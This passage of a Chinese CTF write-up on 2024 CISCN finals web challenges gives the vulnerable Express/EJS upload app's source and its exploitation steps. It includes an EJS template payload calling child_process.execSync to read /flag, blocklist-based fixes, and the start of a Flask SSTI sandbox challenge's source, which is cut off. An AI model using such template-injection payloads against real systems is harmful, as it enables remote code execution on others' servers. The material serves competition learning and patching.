keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File uploaded successfully: '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Filename parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span>IfLogin<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!==</span> <span class="token string">'ADMIN'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Access forbidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> oldPath <span class="token punctuation">,</span> newPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath <span class="token operator">||</span> <span class="token operator">!</span>newPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Missing oldPath or newPath'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_file <span class="token operator">=</span> newPath<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> oldFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> oldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> new_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newFilePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'oldPath parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Old file not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'New file path already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span>    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">,</span> newFilePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error renaming file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error renaming file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File renamed successfully'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'3000'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"express-file-upload-app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"ezjs"</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node app.js"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.6"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.4"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ejs v3.1.6，但是看了下<code>render</code>没有参数可控</p><p>接下来考虑express引擎解析的漏洞，参考：<a href="https://xz.aliyun.com/t/13512">https://xz.aliyun.com/t/13512</a></p><p>上传index.js</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112355986.png" alt="image-20240720112355986"></p><p>然后目录穿越移动到node_modules下</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112416310.png" alt="image-20240720112416310"></p><p>接下来再上传一个.ttt后缀的文件</p><p>接下来&#x2F;render路由先渲染1.ttt，再渲染1.ejs即可带出回显</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112540877.png" alt="image-20240720112540877"></p><p>然后换一个后缀故技重施即可</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112948693.png" alt="image-20240720112948693"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112927334.png" alt="image-20240720112927334"></p><hr><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>来自<a href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p><p>.ejs 绕过文件上传</p><p>render 传参 .ejs&#x2F;…&#x2F; 绕过 render 检验</p><pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">%></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>加一下中间件和重命名的路径名称黑名单即可，应该只需要过滤上传js即可，感觉是这么抢血的</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 配置 multer 上传中间件</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// 使用自定义存储选项</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.js'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 如果文件后缀为 .js，则拒绝上传该文件</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .js files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*...*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ShareCard（break复现）"><a href="#ShareCard（break复现）" class="headerlink" title="ShareCard（break复现）"></a>ShareCard（break复现）</h2><blockquote><p>SSTI + 沙盒逃逸</p></blockquote><p>思路参考：nepnep战队的知识分享会 <a href="https://www.bilibili.com/video/BV1gDv1eFEyN/">https://www.bilibili.com/video/BV1gDv1eFEyN/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> current_app<span class="token keyword">from</span> jinja2<span class="token punctuation">.</span>sandbox <span class="token keyword">import</span> SandboxedEnvironment<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> qrcode<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> jwt<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token 